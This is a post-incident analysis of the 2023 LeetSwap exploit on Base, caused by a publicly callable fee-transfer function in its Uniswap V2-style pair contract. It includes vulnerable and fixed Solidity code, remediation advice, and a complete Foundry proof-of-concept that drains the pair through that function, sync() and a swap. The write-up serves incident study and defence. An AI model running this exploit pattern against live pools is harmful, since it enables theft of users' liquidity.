# LeetSwap — Access Control Vulnerability (_transferFeesSupportingTaxTokens Public Exposure) Analysis

| Item | Details |
|------|------|
| **Date** | 2023-08-01 |
| **Protocol** | LeetSwap (Base chain DEX) |
| **Chain** | Base (Coinbase L2) |
| **Loss** | ~$630,000 (~340+ ETH) |
| **Attacker** | [0x705f...085c3](https://basescan.org/address/0x705f736145bb9d4a4a186f4595907b60815085c3) |
| **Attack Contract** | [0xea8f...f560](https://basescan.org/address/0xea8f89f47f3d4293897b4fe8cb69b5c233b9f560) |
| **Attack Tx** | [0xbb83...10ec](https://basescan.org/tx/0xbb837d417b76dd237b4418e1695a50941a69259a1c4dee561ea57d982b9f10ec) |
| **Vulnerable Contract** | [0x94da...90cf](https://basescan.org/address/0x94dac4a3ce998143aa119c05460731da80ad90cf) (LeetSwapV2Pair) |
| **Root Cause** | No access control on `_transferFeesSupportingTaxTokens()` — anyone can transfer tokens out of the pair contract |
| **Attack Block** | 2,031,746 (Base) |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-08/Leetswap_exp.sol) |

---

## 1. Vulnerability Overview

LeetSwap was a DEX (Decentralized Exchange) operating on Base, Coinbase's L2 chain. On August 1, 2023, it suffered approximately $630,000 in losses due to a **missing access control vulnerability on the `_transferFeesSupportingTaxTokens()` function** in the LeetSwapV2Pair contract.

This function was originally designed as an internal helper to **transfer fees from tax tokens to a separate fee contract (`fees`)**, but was declared with `public` visibility, making it **callable by anyone externally**. The attacker directly invoked this function to drain most of the tokens held by the pair contract to the fee contract, then manipulated the reserves via `sync()`, and illegitimately obtained WETH through swaps.

**Core attack mechanism:**
1. Attacker swaps a small amount of WETH for axlUSDC to acquire axlUSDC balance within the pair contract
2. Directly calls `_transferFeesSupportingTaxTokens(axlUSDC, balance - 100)` → moves nearly all axlUSDC from the pair to the `fees` address (reserves still retain the previous values)
3. Calls `sync()` → forces the pair's `reserve` to update to the actual balance (axlUSDC ≈ 100 wei)
4. Swaps the attacker's axlUSDC for WETH → since axlUSDC reserve is now extremely small in the swap formula (x*y=k), a tiny amount of axlUSDC yields a large amount of WETH

This attack was executed without a Flash Loan — purely through the combination of an **Access Control Vulnerability** and **AMM reserve manipulation**. The attacker repeated the same method across **multiple pairs**, causing a total of ~$630,000 in damage.

---

## 2. Vulnerable Code Analysis

### 2.1 `_transferFeesSupportingTaxTokens()` — Core Vulnerability (Missing Access Control)

**Vulnerable code** ❌:
```solidity
// ❌ Vulnerable: declared with public visibility, callable externally by anyone
// This function was designed to be an internal helper,
// but is exposed as public, allowing attackers to arbitrarily drain the pair's token balance
function _transferFeesSupportingTaxTokens(address token, uint256 amount)
    public                    // ❌ public — callable by anyone externally
    returns (uint256)
{
    if (amount == 0) {
        return 0;
    }

    uint256 balanceBefore = IERC20(token).balanceOf(fees);
    _safeTransfer(token, fees, amount);  // ❌ transfers token from pair contract to fees address
    uint256 balanceAfter = IERC20(token).balanceOf(fees);

    return balanceAfter - balanceBefore;
    // ⚠️ This function does not update reserves,
    // resulting in actual balance < reserve → sync() can force reserve shrinkage
}
```

**Fixed code** ✅:
```solidity
// ✅ Fix 1: Change to internal visibility (prevents direct external calls)
function _transferFeesSupportingTaxTokens(address token, uint256 amount)
    internal                  // ✅ internal — callable only from within the contract
    returns (uint256)
{
    if (amount == 0) {
        return 0;
    }

    uint256 balanceBefore = IERC20(token).balanceOf(fees);
    _safeTransfer(token, fees, amount);
    uint256 balanceAfter = IERC20(token).balanceOf(fees);

    return balanceAfter - balanceBefore;
}

// ✅ Fix 2: If public visibility must be retained, add authorization check
function _transferFeesSupportingTaxTokens(address token, uint256 amount)
    public
    returns (uint256)
{
    // ✅ Only the contract itself (via internal call during swap) can execute
    require(msg.sender == address(this), "LeetSwap: FORBIDDEN");
    // Or apply Uniswap V2 pattern: lock modifier + onlyPair validation

    if (amount == 0) {
        return 0;
    }

    uint256 balanceBefore = IERC20(token).balanceOf(fees);
    _safeTransfer(token, fees, amount);
    uint256 balanceAfter = IERC20(token).balanceOf(fees);

    return balanceAfter - balanceBefore;
}
```

**Issue**: The `_transferFeesSupportingTaxTokens()` function implies it is an internal function by naming convention (underscore prefix `_`), but its actual Solidity visibility is declared as `public`, making it **arbitrarily callable from outside**. When this function is called, the pair contract's token balance decreases but the `reserve` value is not updated — so when `sync()` is subsequently called, the reserve re-synchronizes to the actual balance, **breaking the AMM invariant (x*y=k)**.

---

### 2.2 `sync()` — Reserve Manipulation Vector

**Relevant code**:
```solidity
// sync() itself is normal, but becomes an attack vector when combined with the vulnerable function
function sync() external lock {
    // ✅ Forces reserve to update to actual balance
    // However, if attacker first reduces the balance via _transferFeesSupportingTaxTokens
    // then calls this function, the reserve is set to an extremely small value
    _update(
        IERC20Metadata(token0).balanceOf(address(this)),
        IERC20Metadata(token1).balanceOf(address(this)),
        reserve0,
        reserve1
    );
}
```

**Issue**: `sync()` is a normal function that aligns reserves with the current balance, but if an attacker first drains the pair's tokens via `_transferFeesSupportingTaxTokens()` and then calls it, they can intentionally minimize reserves and distort swap prices.

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Minimal setup required: no Flash Loan needed
- Attack can begin with as little as 0.001 ETH (WETH)
- Attacker identifies the vulnerable function address of LeetSwapV2Pair in advance

### 3.2 Execution Phase

1. **WETH → axlUSDC swap**: Attacker swaps 0.001 WETH for axlUSDC to acquire some axlUSDC
2. **Direct call to vulnerable function**: `Pair._transferFeesSupportingTaxTokens(axlUSDC, pairBalance - 100)` — moves most of the pair's axlUSDC to the `fees` address (reserves unchanged)
3. **Force reserve sync**: `Pair.sync()` — reserves shrink to actual balance (≈100 wei axlUSDC)
4. **axlUSDC → WETH swap**: Attacker swaps their axlUSDC → due to the collapsed reserve, obtains a large amount of WETH at an extremely favorable rate

### 3.3 Attack Flow Diagram

```
  Attacker (EOA)
       │
       │ 0.001 WETH
       ▼
┌─────────────────────────────┐
│  Step 1: WETH → axlUSDC    │
│  Router.swapExactTokens     │
│  ForTokensSupportingFee     │
│  OnTransferTokens()         │
└──────────────┬──────────────┘
               │ receives axlUSDC
               ▼
┌─────────────────────────────────────────────┐
│  Step 2: Direct call to vulnerable function  │
│  Pair._transferFeesSupportingTaxTokens(      │
│      axlUSDC,                                │
│      axlUSDC.balanceOf(Pair) - 100           │  ← ❌ No access control
│  )                                           │
│                                              │
│  Result: Pair's axlUSDC balance → ≈100 wei   │
│          (but reserve still holds prior value)│
└──────────────┬──────────────────────────────┘
               │
               ▼
┌─────────────────────────────┐
│  Step 3: Call sync()        │
│  Pair.sync()                │
│                             │
│  Result: reserve forcibly   │
│  collapsed                  │
│  reserve_axlUSDC ≈ 100 wei  │  ← AMM invariant broken
└──────────────┬──────────────┘
               │
               ▼
┌─────────────────────────────────────────────┐
│  Step 4: axlUSDC → WETH swap                │
│  Router.swapExactTokensForTokens            │
│  SupportingFeeOnTransferTokens()            │
│                                             │
│  In x*y=k, reserve_axlUSDC ≈ 100           │
│  → small axlUSDC yields large WETH          │
└──────────────┬──────────────────────────────┘
               │ receives large amount of WETH
               ▼
         Attacker profit realized
    (~$630,000 / ~340+ ETH)
    (attack repeated across multiple pairs)
```

### 3.3 Outcome

- **Attacker profit**: ~340+ ETH (~$630,000)
- **Protocol loss**: Liquidity drained from multiple LeetSwapV2Pairs
- **Additional impact**: LeetSwap halted all trading as an emergency measure

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// @KeyInfo - Total Lost : ~630K USD$
// Attacker : https://basescan.org/address/0x705f736145bb9d4a4a186f4595907b60815085c3
// Attack Contract : https://basescan.org/address/0xea8f89f47f3d4293897b4fe8cb69b5c233b9f560
// Vulnerable Contract : https://basescan.org/address/0x94dac4a3ce998143aa119c05460731da80ad90cf
// Attack Tx : https://basescan.org/tx/0xbb837d417b76dd237b4418e1695a50941a69259a1c4dee561ea57d982b9f10ec

interface ILeetSwapPair {
    // ❌ Core vulnerable function: exposed as public with no access control
    function _transferFeesSupportingTaxTokens(address token, uint256 amount)
        external returns (uint256);
    function sync() external;
}

contract ContractTest is Test {
    IERC20 WETH = IERC20(0x4200000000000000000000000000000000000006);
    IERC20 axlUSDC = IERC20(0xEB466342C4d449BC9f53A865D5Cb90586f405215);
    Uni_Router_V2 Router = Uni_Router_V2(0xfCD3842f85ed87ba2889b4D35893403796e67FF1);
    ILeetSwapPair Pair = ILeetSwapPair(0x94dAC4a3Ce998143aa119c05460731dA80ad90cf);

    function testExploit() external {
        // [Step 1] Acquire axlUSDC with a small amount of WETH (swap entry)
        deal(address(WETH), address(this), 0.001 ether);
        WETH.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(axlUSDC);

        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            0.001 ether, 0, path, address(this), block.timestamp
        );

        // [Step 2] Core: direct call to vulnerable function — drains pair's axlUSDC to fees
        // No access control, so anyone can call (no onlyInternal/onlyPair check)
        Pair._transferFeesSupportingTaxTokens(
            address(axlUSDC),
            axlUSDC.balanceOf(address(Pair)) - 100  // move all but 100 wei
        );

        // [Step 3] Call sync() — forcibly collapses reserve to actual balance (≈100 wei)
        // AMM invariant x*y=k is completely broken
        Pair.sync();

        // [Step 4] Attacker swaps their axlUSDC for WETH
        // reserve_axlUSDC ≈ 100 wei, so a small amount yields a large amount of WETH
        axlUSDC.approve(address(Router), type(uint256).max);
        path[0] = address(axlUSDC);
        path[1] = address(WETH);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            axlUSDC.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );

        emit log_named_decimal_uint(
            "Attacker WETH balance after exploit",
            WETH.balanceOf(address(this)),
            WETH.decimals()
        );
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | Internal function exposed as public (missing access control) | CRITICAL | CWE-284 | `03_access_control.md` — Pattern 1 |
| V-02 | AMM reserve manipulation (sync() abuse) | HIGH | CWE-682 | `16_accounting_sync.md` |
| V-03 | Token balance and reserve desynchronization | HIGH | CWE-841 | `16_accounting_sync.md` |

### V-01: Internal Function Exposed as Public (Missing Access Control)

- **Description**: The `_transferFeesSupportingTaxTokens()` function is declared with `public` visibility and is directly callable from outside, contrary to the naming convention (`_` prefix) implying it is an internal helper. Since this function transfers the pair contract's token balance to the `fees` address, external exposure allows an attacker to arbitrarily move all of the pair's liquidity.
- **Impact**: Attacker arbitrarily moves pair-held tokens to the `fees` address → reserve manipulation after `sync()` → AMM price distortion → liquidity theft
- **Attack Condition**: The function is declared `public` or `external` with no caller authentication

### V-02: AMM Reserve Manipulation via sync()

- **Description**: The `sync()` function in Uniswap V2 forks aligns reserves with the actual balance. This is a normal function, but if an attacker first manipulates the balance via V-01 and then calls `sync()`, they can intentionally minimize reserves to skew the AMM pricing formula in their favor.
- **Impact**: Collapse of the x*y=k invariant → swaps at rates thousands of times more favorable than normal
- **Attack Condition**: V-01 vulnerability exists + `sync()` is externally callable

### V-03: Token Balance and Reserve Desynchronization

- **Description**: `_transferFeesSupportingTaxTokens()` moves tokens but does not update internal reserves. This design flaw allows an artificial discrepancy between the actual balance and the reserve.
- **Impact**: When `sync()` is called in a desynchronized state, reserves are corrected to the actual (extremely small) balance → price manipulation complete
- **Attack Condition**: V-01 vulnerability exists

---

## 6. Remediation Recommendations

### Immediate Action

**Core fix: Change `_transferFeesSupportingTaxTokens()` visibility**

```solidity
// ✅ Fix: Change to internal to completely block external calls
function _transferFeesSupportingTaxTokens(address token, uint256 amount)
    internal                          // public → internal
    returns (uint256)
{
    if (amount == 0) {
        return 0;
    }

    uint256 balanceBefore = IERC20(token).balanceOf(fees);
    _safeTransfer(token, fees, amount);
    uint256 balanceAfter = IERC20(token).balanceOf(fees);

    return balanceAfter - balanceBefore;
}
```

**Or, if external visibility must be retained — add caller authentication**

```solidity
// ✅ Restrict calls to only the router or the contract itself
modifier onlyAuthorized() {
    require(
        msg.sender == address(this) || msg.sender == factory,
        "LeetSwap: FORBIDDEN"
    );
    _;
}

function _transferFeesSupportingTaxTokens(address token, uint256 amount)
    external
    onlyAuthorized            // ✅ Access control added
    returns (uint256)
{
    // ... existing logic
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: Internal function exposure | Declare fee transfer functions as `internal` or `private`. Do not rely solely on naming conventions (`_` prefix) — use Solidity visibility keywords explicitly |
| V-02: sync abuse | `sync()` already has a `lock` modifier, but the root fix is blocking any reserve manipulation path outside of normal swaps (requires V-01 fix as a prerequisite) |
| V-03: Balance-reserve desynchronization | Immediately update reserves after any function that moves tokens, or add invariant checks that prevent balance-reserve discrepancies |
| General | Security audit mandatory before deployment. Especially for Uniswap V2 forks, thoroughly review access control on all custom functions added (e.g., tax token support functions) |
| Monitoring | Implement on-chain monitoring for abnormal reserve changes, standalone `sync()` call patterns, and patterns of large withdrawals following small swaps |

---

## 7. Lessons Learned

1. **Naming conventions are not security controls**: In Solidity, an underscore prefix (`_`) conventionally implies an internal function but has no bearing on actual access control. Visibility must always be explicitly specified using `internal`/`private` keywords.

2. **Beware of custom functions in Uniswap V2 forks**: When adding new features (e.g., tax token support) on top of a base protocol (Uniswap V2), interactions with the existing security model must be carefully reviewed. In particular, any function that affects the reserve-balance synchronization model must be kept internal.

3. **Reserve manipulation = AMM destruction**: All security in an AMM is based on the invariant that reserves match actual balances. If this invariant can be broken externally, large-scale price manipulation is possible without a Flash Loan.

4. **New DEXes on L2 chains are high-risk**: Early-stage DEXes on new L2 chains such as Base are often insufficiently audited. Verifying contract code before providing liquidity is essential.

5. **Principle of Least Privilege**: Every function in a contract should be declared with the minimum required visibility. `public`/`external` functions should only be used when strictly necessary, and appropriate access controls must always be added when exposing functions externally.

6. **Blast radius of a single function vulnerability**: A single `public` function exposure can lead to the theft of an entire protocol's liquidity. This incident resulted in $630,000 in losses, but the same pattern in a protocol with larger TVL could cause losses in the hundreds of millions.

---

## 8. On-Chain Verification

> On-chain transaction verification was performed using WebFetch without the `cast` (Foundry) tool.

### 8.1 PoC vs. On-Chain Data Comparison

| Item | PoC Value | On-Chain / Reported Value | Match |
|------|--------|----------------|------|
| Attacker address | 0x705f...085c3 | 0x705f736145bb9d4a4a186f4595907b60815085c3 | ✅ |
| Attack contract | 0xea8f...f560 | 0xea8f89f47f3d4293897b4fe8cb69b5c233b9f560 | ✅ |
| Vulnerable contract (pair) | 0x94da...90cf | 0x94dac4a3ce998143aa119c05460731da80ad90cf | ✅ |
| Attack block | 2,031,746 | 2,031,746 (Base) | ✅ |
| Total loss | ~$630,000 | ~$630,000 (~340+ ETH) | ✅ |
| Attack Tx | 0xbb83...10ec | 0xbb837d417b76dd237b4418e1695a50941a69259a1c4dee561ea57d982b9f10ec | ✅ |

### 8.2 Attack Sequence Confirmation

Attack sequence confirmed via PoC code and external analysis reports (BlockSec, PeckShield):
1. `swapExactTokensForTokensSupportingFeeOnTransferTokens` (WETH → axlUSDC)
2. `_transferFeesSupportingTaxTokens(axlUSDC, balance - 100)` — core vulnerable call
3. `sync()` — forcible reserve collapse
4. `swapExactTokensForTokensSupportingFeeOnTransferTokens` (axlUSDC → WETH)

The attacker repeated the same pattern across multiple LeetSwapV2Pair pools, with losses occurring across numerous pairs including the axlUSDC/WETH pair.

### 8.3 External Analysis References

- BlockSec: https://twitter.com/BlockSecTeam/status/1686217464051539968
- PeckShield: https://twitter.com/peckshield/status/1686209024587710464
- Neptune Mutual analysis: https://neptunemutual.com/blog/how-was-leetswap-exploited/
- Medium (Shashank): https://medium.com/coinmonks/leetswap-hack-analysis-81323527b3f7

---

*Document date: 2026-04-11 | Authored with: Claude Code (incident-analysis skill)*